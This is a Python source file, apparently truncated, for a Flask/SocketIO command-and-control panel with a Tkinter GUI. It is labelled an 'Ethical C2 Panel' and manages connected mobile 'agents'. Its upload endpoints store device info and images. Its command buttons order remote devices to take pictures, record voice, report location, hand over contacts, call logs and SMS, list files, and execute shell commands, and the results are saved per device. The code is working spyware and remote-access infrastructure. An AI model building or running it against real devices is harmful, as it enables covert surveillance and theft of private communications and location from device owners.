# c2_panel/app.py

import os
import json
import datetime
import threading
import logging
import webbrowser  # <<<< تمت الإضافة: لاستدعاء مشغل الصوت الافتراضي

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from PIL import Image, ImageTk

# --- Basic Settings ---
APP_ROOT = os.path.dirname(os.path.abspath(__file__))
DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
os.makedirs(DATA_RECEIVED_DIR, exist_ok=True)

# Flask and SocketIO Setup
app = Flask(__name__)
# تم تعيين SECRET_KEY إلى قيمة قوية وفريدة، عدلها عند الحاجة
app.config["SECRET_KEY"] = "Jk8lP1yH3rT9uV5bX2sE7qZ4oW6nD0fA"
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    logger=False,
    engineio_logger=False,
)  # Reduce socketio logging

# Logging Setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("C2Panel")

connected_clients_sio = {}
gui_app = None


# --- Flask API Endpoints ---
@app.route("/")
def index():
    return "C2 Panel is Running. Waiting for connections..."


@app.route("/upload_initial_data", methods=["POST"])
def upload_initial_data():
    logger.info("Request to /upload_initial_data")
    try:
        json_data_str = request.form.get("json_data")
        if not json_data_str:
            logger.error("No json_data found in request.")
            return jsonify({"status": "error", "message": "Missing json_data"}), 400

        try:
            data = json.loads(json_data_str)
            device_info_summary = data.get("deviceInfo", {}).get("model", "N/A")
            logger.info(f"Received JSON (model: {device_info_summary})")
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON received: {json_data_str[:100]}... Error: {e}")
            return jsonify({"status": "error", "message": "Invalid JSON format"}), 400

        device_info = data.get("deviceInfo", {})
        raw_device_id = data.get("deviceId", None)
        if (
            not raw_device_id
            or not isinstance(raw_device_id, str)
            or len(raw_device_id) < 5
        ):
            logger.warning(
                f"Received invalid or missing 'deviceId' from client: {raw_device_id}. Falling back."
            )
            model = device_info.get("model", "unknown_model")
            name = device_info.get("deviceName", "unknown_device")
            raw_device_id = f"{model}_{name}"

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in raw_device_id
        )
        if not device_id_sanitized or device_id_sanitized.lower() in [
            "unknown_model_unknown_device",
            "_",
            "unknown_device_unknown_model",
        ]:
            device_id_sanitized = f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        logger.info(f"Processing for Device ID (Sanitized): {device_id_sanitized}")
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        os.makedirs(device_folder_path, exist_ok=True)

        info_file_name = (
            f'info_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        )
        info_file_path = os.path.join(device_folder_path, info_file_name)
        with open(info_file_path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        logger.info(f"Saved JSON to {info_file_path}")

        image_file = request.files.get("image")
        if image_file and image_file.filename:
            filename = os.path.basename(image_file.filename)
            base, ext = os.path.splitext(filename)
            if not ext:
                ext = ".jpg"
            image_filename = (
                f"initial_img_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            )
            image_path = os.path.join(device_folder_path, image_filename)
            image_file.save(image_path)
            logger.info(f"Saved image to {image_path}")
        else:
            logger.info("No image file in initial data upload or filename was empty.")

        if gui_app:
            gui_app.add_system_log(f"Initial data from: {device_id_sanitized}")
            gui_app.refresh_historical_device_list()

        return jsonify({"status": "success", "message": "Initial data received"}), 200

    except Exception as e:
        logger.error(f"Error processing /upload_initial_data: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {e}"}),
            500,
        )


# --- SocketIO Event Handlers ---
@socketio.on("connect")
def handle_sio_connect():
    client_sid = request.sid
    logger.info(
        f"Client attempting to connect: SID={client_sid}, IP={request.remote_addr}"
    )


@socketio.on("disconnect")
def handle_sio_disconnect():
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        device_info = connected_clients_sio.pop(client_sid)
        dev_id_display = device_info.get("id", client_sid)
        logger.info(
            f"Device '{dev_id_display}' disconnected (SID={client_sid}, IP={device_info.get('ip','N/A')})."
        )
        if gui_app:
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{dev_id_display}' disconnected (SocketIO)."
            )
    else:
        logger.warning(
            f"Unknown client disconnected: SID={client_sid}, IP={request.remote_addr}."
        )


@socketio.on("register_device")
def handle_register_device(data):
    client_sid = request.sid
    try:
        device_identifier = data.get("deviceId", None)
        device_name_display = data.get("deviceName", f"Device_{client_sid[:6]}")
        device_platform = data.get("platform", "Unknown")

        if not device_identifier:
            logger.error(
                f"Registration failed for SID {client_sid}: 'deviceId' missing. Data: {data}"
            )
            emit(
                "registration_failed",
                {"message": "Missing 'deviceId' in registration payload."},
                room=client_sid,
            )
            return

        connected_clients_sio[client_sid] = {
            "sid": client_sid,
            "id": device_identifier,
            "name_display": device_name_display,
            "platform": device_platform,
            "ip": request.remote_addr,
            "connected_at": datetime.datetime.now().isoformat(),
            "last_seen": datetime.datetime.now().isoformat(),
        }
        logger.info(
            f"Device registered: ID='{device_identifier}', Name='{device_name_display}', SID={client_sid}, IP={request.remote_addr}"
        )
        emit(
            "registration_successful",
            {"message": "Successfully registered with C2 panel.", "sid": client_sid},
            room=client_sid,
        )

        if gui_app:
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{device_name_display}' (ID: {device_identifier}) connected via SocketIO from {request.remote_addr}."
            )
            if gui_app.current_selected_historical_device_id == device_identifier:
                gui_app._enable_commands(True)

    except Exception as e:
        logger.error(
            f"Error in handle_register_device for SID {client_sid}: {e}", exc_info=True
        )
        emit(
            "registration_failed",
            {"message": f"Server error during registration: {e}"},
            room=client_sid,
        )


@socketio.on("device_heartbeat")
def handle_device_heartbeat(data):
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        connected_clients_sio[client_sid][
            "last_seen"
        ] = datetime.datetime.now().isoformat()
        if gui_app:
            gui_app.update_live_clients_list_item(client_sid)
    else:
        logger.warning(
            f"Heartbeat from unknown/unregistered SID: {client_sid}. Data: {data}. Requesting registration."
        )
        emit("request_registration_info", {}, room=client_sid)


# --- Command Dispatcher to Client ---
def send_command_to_client(target_sid, command_name, args=None):
    if args is None:
        args = {}
    if target_sid in connected_clients_sio:
        client_info = connected_clients_sio[target_sid]
        logger.info(
            f"Sending command '{command_name}' to device ID '{client_info['id']}' (SID: {target_sid}) with args: {args}"
        )
        socketio.emit(command_name, args, to=target_sid)  # Use 'to=' for specific SID
        if gui_app:
            gui_app.add_system_log(
                f"Sent command '{command_name}' to device '{client_info['id']}'."
            )
        return True
    else:
        errmsg = f"Target SID {target_sid} not found for command '{command_name}'."
        logger.error(errmsg)
        if gui_app:
            gui_app.add_system_log(errmsg, error=True)
            messagebox.showerror(
                "Command Error",
                f"Device (SID: {target_sid}) is not connected via SocketIO.",
            )
        return False


# --- Command Response Handler ---
@socketio.on("command_response")
def handle_command_response(data):
    client_sid = request.sid
    device_info = connected_clients_sio.get(client_sid)
    device_id_str = (
        device_info["id"]
        if device_info and "id" in device_info
        else f"SID_{client_sid}"
    )

    command_name = data.get("command", "unknown_command")
    status = data.get("status", "unknown")
    payload = data.get("payload", {})
    logger.info(
        f"Response for '{command_name}' from '{device_id_str}'. Status: {status}. Payload keys: {list(payload.keys()) if isinstance(payload, dict) else 'Not dict'}"
    )

    # حفظ الملفات المختلفة إذا كان الأمر ناجحًا
    if status == "success":
        file_to_save_data = None
        if command_name == "command_get_contacts" and "contacts" in payload:
            file_to_save_data = ("contacts", payload)
        elif command_name == "command_get_call_logs" and "call_logs" in payload:
            file_to_save_data = ("call_logs", payload)
        elif command_name == "command_get_sms" and "sms_messages" in payload:
            file_to_save_data = ("sms", payload)
        # NEW: Handle file listing responses
        elif command_name == "command_list_files" and "files" in payload:
            file_to_save_data = ("file_listing", payload)
        # NEW: Handle shell command responses
        elif command_name == "command_execute_shell" and ("stdout" in payload or "stderr" in payload):
            file_to_save_data = ("shell_output", payload)

        if file_to_save_data:
            prefix, data_to_save_payload = file_to_save_data
            try:
                # التأكد من وجود مجلد للجهاز
                device_id_sanitized = "".join(
                    c if c.isalnum() or c in ["_", "-", "."] else "_"
                    for c in device_id_str
                )
                device_folder_path = os.path.join(
                    DATA_RECEIVED_DIR, device_id_sanitized
                )
                os.makedirs(device_folder_path, exist_ok=True)

                # إنشاء اسم فريد للملف
                filename = (
                    f"{prefix}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                )
                file_path = os.path.join(device_folder_path, filename)

                # حفظ البيانات في ملف JSON
                with open(file_path, "w", encoding="utf-8") as f:
                    json.dump(data_to_save_payload, f, ensure_ascii=False, indent=4)

                logger.info(
                    f"Saved {prefix} data for device '{device_id_sanitized}' to {file_path}"
                )

                if gui_app:
                    # إرسال سجل للنظام وتحديث قائمة الملفات في الواجهة
                    gui_app.add_system_log(
                        f"Saved {prefix} file '{filename}' for device '{device_id_sanitized}'."
                    )
                    # تحديث عرض التفاصيل بالكامل لإظهار الملف الجديد
                    if (
                        gui_app.current_selected_historical_device_id
                        == device_id_sanitized
                    ):
                        gui_app.display_device_details(device_id_sanitized)

            except Exception as e:
                logger.error(
                    f"Failed to save {prefix} file for device '{device_id_str}': {e}",
                    exc_info=True,
                )
                if gui_app:
                    gui_app.add_system_log(
                        f"Error saving {prefix} file: {e}", error=True
                    )

    # عرض الاستجابة في واجهة المستخدم
    if gui_app:
        gui_app.add_system_log(
            f"Response for '{command_name}' from '{device_id_str}': {status}"
        )
        gui_app.display_command_response(device_id_str, command_name, status, payload)

        # تحديث قائمة الملفات إذا تم رفع ملف (صورة أو صوت) كنتيجة لأمر ما
        # هذا الشرط أصبح عاماً ليشمل ملفات الصوت أيضاً
        if (
            "filename_on_server" in payload
            or (command_name == "command_record_voice" and status == "success")
        ) and gui_app.current_selected_historical_device_id == device_id_str:
            gui_app.display_device_details(device_id_str)


# --- Endpoint for Files from Commands ---
@app.route("/upload_command_file", methods=["POST"])
def upload_command_file():
    logger.info("Request to /upload_command_file")
    try:
        device_id = request.form.get("deviceId")
        command_ref = request.form.get("commandRef", "unknown_cmd_ref")

        if not device_id:
            logger.error("'deviceId' missing in command file upload.")
            return jsonify({"status": "error", "message": "Missing deviceId"}), 400

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in device_id
        )
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        if not os.path.exists(device_folder_path):
            logger.warning(f"Device folder '{device_folder_path}' not found. Creating.")
            os.makedirs(device_folder_path, exist_ok=True)
            if gui_app:
                gui_app.refresh_historical_device_list()

        file_data = request.files.get("file")
        if file_data and file_data.filename:
            original_filename = os.path.basename(file_data.filename)
            base, ext = os.path.splitext(original_filename)
            if not ext:  # <<<< إذا لم يكن هناك امتداد، افترض .dat
                if (
                    "audio" in command_ref.lower()
                    or "recording" in command_ref.lower()
                    or "voice" in command_ref.lower()  # NEW: Added voice detection
                    or original_filename.startswith("rec_")
                    or original_filename.startswith("voice_")  # NEW: Added voice_ prefix
                ):
                    ext = ".3gp"  # Updated to match Flutter implementation
                else:
                    ext = ".dat"

            safe_command_ref = "".join(c if c.isalnum() else "_" for c in command_ref)
            # تعديل طفيف على اسم الملف ليكون أوضح قليلاً إذا كان صوتياً
            if (
                "audio" in safe_command_ref.lower()
                or "recording" in safe_command_ref.lower()
                or "voice" in safe_command_ref.lower()  # NEW: Added voice detection
            ):
                new_filename_base = (
                    f"voice_rec_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
                )
            else:
                new_filename_base = f"{safe_command_ref}_{base}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"

            new_filename = f"{new_filename_base}{ext}"

            file_path = os.path.join(device_folder_path, new_filename)
            file_data.save(file_path)
            logger.info(
                f"Saved command file '{new_filename}' for device '{device_id_sanitized}' to {file_path}"
            )

            if gui_app:
                gui_app.add_system_log(
                    f"Received file '{new_filename}' from device '{device_id_sanitized}' (Ref: {command_ref})."
                )
                if gui_app.current_selected_historical_device_id == device_id_sanitized:
                    gui_app.display_device_details(device_id_sanitized)
            return (
                jsonify(
                    {
                        "status": "success",
                        "message": "File received by C2",
                        "filename_on_server": new_filename,
                    }
                ),
                200,
            )
        else:
            logger.error(
                "No file data in /upload_command_file request or filename empty."
            )
            return (
                jsonify({"status": "error", "message": "Missing file data in request"}),
                400,
            )

    except Exception as e:
        logger.error(f"Error processing /upload_command_file: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {e}"}),
            500,
        )


# --- GUI Class ---
class C2PanelGUI:
    def __init__(self, master):
        self.master = master
        master.title("Ethical C2 Panel - v1.1.0")  # <<<< تم تعديل الإصدار
        master.geometry("1280x800")
        master.minsize(1024, 700)

        self.style = ttk.Style()
        try:
            self.style.theme_use("clam")
        except tk.TclError:
            logger.warning("Clam theme not available, using default.")
            self.style.theme_use("default")

        self.style.configure("Treeview.Heading", font=("Segoe UI", 10, "bold"))
        self.style.configure("TLabel", font=("Segoe UI", 9))
        self.style.configure("TButton", font=("Segoe UI", 9))
        self.style.configure(
            "TLabelframe.Label", font=("Segoe UI", 10, "bold"), foreground="teal"
        )

        self.current_selected_historical_device_id = None
        self.current_selected_live_client_sid = None

        self.paned_window = ttk.PanedWindow(master, orient=tk.HORIZONTAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.left_pane = ttk.Frame(self.paned_window, width=400)
        self.paned_window.add(self.left_pane, weight=1)

        hist_devices_frame = ttk.LabelFrame(self.left_pane, text="Stored Device Data")
        hist_devices_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.hist_device_listbox = tk.Listbox(
            hist_devices_frame, height=12, exportselection=False, font=("Segoe UI", 9)
        )
        self.hist_device_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        self.hist_device_listbox.bind(
            "<<ListboxSelect>>", self.on_historical_device_select
        )
        hist_scrollbar = ttk.Scrollbar(
            hist_devices_frame,
            orient=tk.VERTICAL,
            command=self.hist_device_listbox.yview,
        )
        hist_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.hist_device_listbox.config(yscrollcommand=hist_scrollbar.set)
        hist_refresh_btn = ttk.Button(
            hist_devices_frame,
            text="Refresh Stored List",
            command=self.refresh_historical_device_list,
        )
        hist_refresh_btn.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=3)

        live_clients_frame = ttk.LabelFrame(
            self.left_pane, text="Live Connected Agents"
        )
        live_clients_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.live_clients_tree = ttk.Treeview(
            live_clients_frame,
            columns=("id", "ip", "platform", "last_seen"),
            show="headings",
            height=12,
            selectmode="browse",
        )
        self.live_clients_tree.heading("id", text="Agent ID / Name")
        self.live_clients_tree.column("id", width=150, anchor=tk.W)
        self.live_clients_tree.heading("ip", text="IP Address")
        self.live_clients_tree.column("ip", width=100, anchor=tk.W)
        self.live_clients_tree.heading("platform", text="Platform")
        self.live_clients_tree.column("platform", width=70, anchor=tk.W)
        self.live_clients_tree.heading("last_seen", text="Last Seen")
        self.live_clients_tree.column("last_seen", width=130, anchor=tk.W)
        self.live_clients_tree.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        self.live_clients_tree.bind("<<TreeviewSelect>>", self.on_live_client_select)
        live_scrollbar = ttk.Scrollbar(
            live_clients_frame, orient=tk.VERTICAL, command=self.live_clients_tree.yview
        )
        live_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.live_clients_tree.config(yscrollcommand=live_scrollbar.set)

        self.right_pane = ttk.PanedWindow(self.paned_window, orient=tk.VERTICAL)
        self.paned_window.add(self.right_pane, weight=3)

        details_outer_frame = ttk.Frame(self.right_pane)
        self.right_pane.add(details_outer_frame, weight=3)

        details_frame = ttk.LabelFrame(
            details_outer_frame, text="Agent Information & Interaction"
        )
        details_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.details_notebook = ttk.Notebook(details_frame)
        self.details_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.tab_info_json = ttk.Frame(self.details_notebook)
        self.tab_file_viewer = ttk.Frame(self.details_notebook)
        self.tab_command_responses = ttk.Frame(self.details_notebook)
        self.details_notebook.add(self.tab_info_json, text="Stored Info")
        self.details_notebook.add(self.tab_file_viewer, text="Files & Images")
        self.details_notebook.add(self.tab_command_responses, text="Command History")

        self.info_json_text = scrolledtext.ScrolledText(
            self.tab_info_json, wrap=tk.WORD, height=10, font=("Consolas", 9)
        )
        self.info_json_text.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.info_json_text.config(state=tk.DISABLED)

        file_viewer_pane = ttk.PanedWindow(self.tab_file_viewer, orient=tk.HORIZONTAL)
        file_viewer_pane.pack(fill=tk.BOTH, expand=True)

        self.file_listbox = tk.Listbox(
            file_viewer_pane, height=8, exportselection=False, font=("Segoe UI", 9)
        )
        file_viewer_pane.add(self.file_listbox, weight=1)
        self.file_listbox.bind("<<ListboxSelect>>", self.on_file_select_in_viewer)

        self.image_display_frame = ttk.Frame(file_viewer_pane)
        file_viewer_pane.add(self.image_display_frame, weight=2)
        self.image_display_label = ttk.Label(
            self.image_display_frame,
            text="Select an image or audio file to view/play",
            anchor=tk.CENTER,  # <<<< تم التعديل
        )
        self.image_display_label.pack(pady=5, fill=tk.BOTH, expand=True)

        self.command_response_text = scrolledtext.ScrolledText(
            self.tab_command_responses, wrap=tk.WORD, height=10, font=("Consolas", 9)
        )
        self.command_response_text.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.command_response_text.config(state=tk.DISABLED)

        commands_outer_frame = ttk.LabelFrame(
            details_outer_frame, text="Agent Commands"
        )
        commands_outer_frame.pack(pady=5, padx=5, fill=tk.X, side=tk.BOTTOM)
        self.commands_frame_content = ttk.Frame(commands_outer_frame)
        self.commands_frame_content.pack(fill=tk.X, padx=5, pady=5)

        # Row 1: Basic commands
        cmd_btn_frame1 = ttk.Frame(self.commands_frame_content)
        cmd_btn_frame1.pack(fill=tk.X, pady=2)
        self.cmd_take_picture_btn = ttk.Button(
            cmd_btn_frame1,
            text="Take Picture",
            command=self.cmd_take_picture,
            state=tk.DISABLED,
        )
        self.cmd_take_picture_btn.pack(side=tk.LEFT, padx=3)
        self.cmd_list_files_btn = ttk.Button(
            cmd_btn_frame1,
            text="List Files",
            command=self.cmd_list_files,
            state=tk.DISABLED,
        )
        self.cmd_list_files_btn.pack(side=tk.LEFT, padx=3)
        self.cmd_get_location_btn = ttk.Button(
            cmd_btn_frame1,
            text="Get Location",
            command=self.cmd_get_location,
            state=tk.DISABLED,
        )
        self.cmd_get_location_btn.pack(side=tk.LEFT, padx=3)

        # NEW: Voice recording button
        self.cmd_record_voice_btn = ttk.Button(
            cmd_btn_frame1,
            text="Record Voice",
            command=self.cmd_record_voice,
            state=tk.DISABLED,
        )
        self.cmd_record_voice_btn.pack(side=tk.LEFT, padx=3)

        # NEW: Shell command button
        self.cmd_shell_btn = ttk.Button(
            cmd_btn_frame1,
            text="Execute Shell",
            command=self.cmd_execute_shell,
            state=tk.DISABLED,
        )
        self.cmd_shell_btn.pack(side=tk.LEFT, padx=3)

        # Row 2: Data extraction commands
        cmd_btn_frame_data = ttk.Frame(self.commands_frame_content)
        cmd_btn_frame_data.pack(fill=tk.X, pady=2)

        self.cmd_get_contacts_btn = ttk.Button(
            cmd_btn_frame_data,
            text="Get Contacts",
            command=self.cmd_get_contacts,
            state=tk.DISABLED,
        )
        self.cmd_get_contacts_btn.pack(side=tk.LEFT, padx=3)

        self.cmd_get_call_logs_btn = ttk.Button(
            cmd_btn_frame_data,
            text="Get Call Logs",
            command=self.cmd_get_call_logs,
            state=tk.DISABLED,
        )
        self.cmd_get_call_logs_btn.pack(side=tk.LEFT, padx=3)

        self.cmd_get_sms_btn = ttk.Button(
            cmd_btn_frame_data,
            text="Get SMS",
            command=self.cmd_get_sms,
            state=tk.DISABLED,
        )
        self.cmd_get_sms_btn.pack(side=tk.LEFT, padx=3)

        self.cmd_show_map_btn = ttk.Button(
            cmd_btn_frame_data,
            text="Show on Map",
            command=self.cmd_show_map,
            state=tk.DISABLED,
        )
        self.cmd_show_map_btn.pack(side=tk.LEFT, padx=3)

        # Row 3: Custom command
        cmd_btn_frame2 = ttk.Frame(self.commands_frame_content)
        cmd_btn_frame2.pack(fill=tk.X, pady=2)
        ttk.Label(cmd_btn_frame2, text="Custom Cmd:").pack(side=tk.LEFT, padx=(0, 2))
        self.custom_cmd_event_entry = ttk.Entry(cmd_btn_frame2, width=20)
        self.custom_cmd_event_entry.pack(side=tk.LEFT, padx=3)
        self.custom_cmd_event_entry.insert(0, "event_name")
        ttk.Label(cmd_btn_frame2, text="Args (JSON):").pack(side=tk.LEFT, padx=(5, 2))
        self.custom_cmd_args_entry = ttk.Entry(cmd_btn_frame2, width=30)
        self.custom_cmd_args_entry.pack(side=tk.LEFT, padx=3, expand=True, fill=tk.X)
        self.custom_cmd_args_entry.insert(0, '{"key": "value"}')
        self.custom_cmd_btn = ttk.Button(
            cmd_btn_frame2, text="Send", command=self.cmd_send_custom, state=tk.DISABLED
        )
        self.custom_cmd_btn.pack(side=tk.LEFT, padx=3)

        log_frame_outer = ttk.Frame(self.right_pane, height=200)
        self.right_pane.add(log_frame_outer, weight=1)
        log_frame = ttk.LabelFrame(log_frame_outer, text="System & C2 Logs")
        log_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        self.log_text_widget = scrolledtext.ScrolledText(
            log_frame, height=10, wrap=tk.WORD, font=("Consolas", 9)
        )
        self.log_text_widget.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text_widget.config(state=tk.DISABLED)

        self.refresh_historical_device_list()
        self.update_live_clients_list()
        self.add_system_log(
            f"C2 Panel GUI Initialized. Flask server port: {FLASK_PORT}. Target URL: {C2_SERVER_URL_FROM_FLUTTER}"
        )

    def _clear_details_view(self):
        self.info_json_text.config(state=tk.NORMAL)
        self.info_json_text.delete(1.0, tk.END)
        self.info_json_text.config(state=tk.DISABLED)
        self.file_listbox.delete(0, tk.END)
        self.image_display_label.config(
            image="", text="Select an image or audio file to view/play"
        )  # <<<< تم التعديل
        self.image_display_label.image = None
        self.command_response_text.config(state=tk.NORMAL)
        self.command_response_text.delete(1.0, tk.END)
        self.command_response_text.config(state=tk.DISABLED)

    def _enable_commands(self, enable=True):
        live_client_selected_and_valid = (
            enable
            and self.current_selected_live_client_sid
            and self.current_selected_live_client_sid in connected_clients_sio
        )

        ui_state = tk.NORMAL if live_client_selected_and_valid else tk.DISABLED
        self.cmd_take_picture_btn.config(state=ui_state)
        self.cmd_list_files_btn.config(state=ui_state)
        self.cmd_get_location_btn.config(state=ui_state)
        self.cmd_get_contacts_btn.config(state=ui_state)
        self.cmd_get_call_logs_btn.config(state=ui_state)
        self.cmd_get_sms_btn.config(state=ui_state)

        # NEW: Enable/disable new command buttons
        self.cmd_record_voice_btn.config(state=ui_state)
        self.cmd_shell_btn.config(state=ui_state)

        self.custom_cmd_btn.config(state=ui_state)
        self.custom_cmd_event_entry.config(state=ui_state)
        self.custom_cmd_args_entry.config(state=ui_state)

        has_location_for_map = False
        if self.current_selected_historical_device_id:
            device_path = os.path.join(
                DATA_RECEIVED_DIR, self.current_selected_historical_device_id
            )
            info_path = self._get_latest_info_json_path(device_path)
            if info_path and os.path.exists(info_path):
                try:
                    with open(info_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    if data.get("location", {}).get("latitude") is not None:
                        has_location_for_map = True
                except Exception as e:
                    logger.debug(f"Error reading location for map button: {e}")

        self.cmd_show_map_btn.config(
            state=tk.NORMAL if has_location_for_map else tk.DISABLED
        )

    def refresh_historical_device_list(self):
        current_selection = self.hist_device_listbox.curselection()
        selected_device_id = None
        if current_selection:
            selected_device_id = self.hist_device_listbox.get(current_selection[0])

        self.hist_device_listbox.delete(0, tk.END)
        if os.path.exists(DATA_RECEIVED_DIR):
            for device_name in sorted(os.listdir(DATA_RECEIVED_DIR)):
                if os.path.isdir(os.path.join(DATA_RECEIVED_DIR, device_name)):
                    self.hist_device_listbox.insert(tk.END, device_name)

        if selected_device_id and selected_device_id in self.hist_device_listbox.get(
            0, tk.END
        ):
            idx = list(self.hist_device_listbox.get(0, tk.END)).index(
                selected_device_id
            )
            self.hist_device_listbox.selection_set(idx)
            self.hist_device_listbox.see(idx)

    def update_live_clients_list_item(self, sid_to_update):
        if sid_to_update in connected_clients_sio and self.live_clients_tree.exists(
            sid_to_update
        ):
            client_data = connected_clients_sio[sid_to_update]
            try:
                last_seen_dt = datetime.datetime.fromisoformat(
                    client_data.get("last_seen", "")
                )
                last_seen_str = last_seen_dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                last_seen_str = "N/A"

            self.live_clients_tree.item(
                sid_to_update,
                values=(
                    client_data.get("name_display", client_data.get("id", "N/A")),
                    client_data.get("ip", "N/A"),
                    client_data.get("platform", "N/A"),
                    last_seen_str,
                ),
            )

    def update_live_clients_list(self):
        selected_sid = None
        if self.live_clients_tree.selection():
            selected_sid = self.live_clients_tree.selection()[0]

        for item in self.live_clients_tree.get_children():
            self.live_clients_tree.delete(item)

        sorted_clients = sorted(
            connected_clients_sio.items(), key=lambda item: item[1].get("id", item[0])
        )
        for sid, client_data in sorted_clients:
            try:
                last_seen_dt = datetime.datetime.fromisoformat(
                    client_data.get("last_seen", "")
                )
                last_seen_str = last_seen_dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                last_seen_str = "N/A"

            self.live_clients_tree.insert(
                "",
                tk.END,
                iid=sid,
                values=(
                    client_data.get("name_display", client_data.get("id", "N/A")),
                    client_data.get("ip", "N/A"),
                    client_data.get("platform", "N/A"),
                    last_seen_str,
                ),
                tags=("live_client",),
            )

        if selected_sid and self.live_clients_tree.exists(selected_sid):
            self.live_clients_tree.selection_set(selected_sid)
            self.live_clients_tree.see(selected_sid)

    def on_historical_device_select(self, event):
        selection = event.widget.curselection()
        if not selection:
            if not self.current_selected_live_client_sid or (
                self.current_selected_live_client_sid in connected_clients_sio
                and connected_clients_sio[self.current_selected_live_client_sid].get(
                    "id"
                )
                != self.current_selected_historical_device_id
            ):
                self.current_selected_historical_device_id = None
            return

        idx = selection[0]
        device_folder_name = event.widget.get(idx)
        self.current_selected_historical_device_id = device_folder_name
        logger.debug(f"Historical device selected: {device_folder_name}")
        self.display_device_details(device_folder_name)

        linked_live_sid = None
        for sid, client_data in connected_clients_sio.items():
            if client_data.get("id") == device_folder_name:
                linked_live_sid = sid
                break

        if linked_live_sid:
            self.current_selected_live_client_sid = linked_live_sid
            if (
                not self.live_clients_tree.selection()
                or self.live_clients_tree.selection()[0] != linked_live_sid
            ):
                if self.live_clients_tree.exists(linked_live_sid):
                    self.live_clients_tree.selection_set(linked_live_sid)
                    self.live_clients_tree.see(linked_live_sid)
            self._enable_commands(True)
            logger.debug(
                f"Linked historical selection to live client SID: {linked_live_sid}"
            )
        else:
            if self.current_selected_live_client_sid:
                pass  # Keep current live selection if no direct historical link
            self._enable_commands(False)

    def on_live_client_select(self, event):
        selected_item_sids = self.live_clients_tree.selection()
        if not selected_item_sids:
            if not self.current_selected_historical_device_id or (
                self.current_selected_live_client_sid in connected_clients_sio
                and connected_clients_sio[self.current_selected_live_client_sid].get(
                    "id"
                )
                != self.current_selected_historical_device_id
            ):
                self.current_selected_live_client_sid = None
            return

        selected_sid = selected_item_sids[0]
        if selected_sid in connected_clients_sio:
            self.current_selected_live_client_sid = selected_sid
            live_client_data = connected_clients_sio[selected_sid]
            device_id_from_live = live_client_data.get("id")
            logger.debug(
                f"Live client selected: SID={selected_sid}, ID={device_id_from_live}"
            )

            if device_id_from_live:
                self.current_selected_historical_device_id = device_id_from_live
                self.display_device_details(device_id_from_live)

                if device_id_from_live in self.hist_device_listbox.get(0, tk.END):
                    hist_idx = list(self.hist_device_listbox.get(0, tk.END)).index(
                        device_id_from_live
                    )
                    if (
                        not self.hist_device_listbox.curselection()
                        or self.hist_device_listbox.curselection()[0] != hist_idx
                    ):
                        self.hist_device_listbox.selection_clear(0, tk.END)
                        self.hist_device_listbox.selection_set(hist_idx)
                        self.hist_device_listbox.see(hist_idx)
                else:
                    if self.hist_device_listbox.curselection():
                        self.hist_device_listbox.selection_clear(0, tk.END)
                    self.add_system_log(
                        f"Live client '{device_id_from_live}' has no matching stored data folder yet."
                    )
            else:
                self.current_selected_historical_device_id = None
                if self.hist_device_listbox.curselection():
                    self.hist_device_listbox.selection_clear(0, tk.END)
                self._clear_details_view()

            self._enable_commands(True)
        else:
            logger.warning(
                f"Selected SID {selected_sid} not in connected_clients_sio. Refreshing list."
            )
            self.update_live_clients_list()
            self.current_selected_live_client_sid = None
            self._enable_commands(False)

    def _get_latest_info_json_path(self, device_path):
        if not os.path.isdir(device_path):
            return None
        info_files = [
            f
            for f in os.listdir(device_path)
            if f.startswith("info_") and f.endswith(".json")
        ]
        if not info_files:
            return None

        def get_sort_key(filename):
            parts = filename.replace("info_", "").replace(".json", "").split("_")
            if len(parts) == 2:
                try:
                    return datetime.datetime.strptime(
                        f"{parts[0]}{parts[1]}", "%Y%m%d%H%M%S"
                    )
                except ValueError:
                    return datetime.datetime.min
            return datetime.datetime.min

        return os.path.join(
            device_path, sorted(info_files, key=get_sort_key, reverse=True)[0]
        )

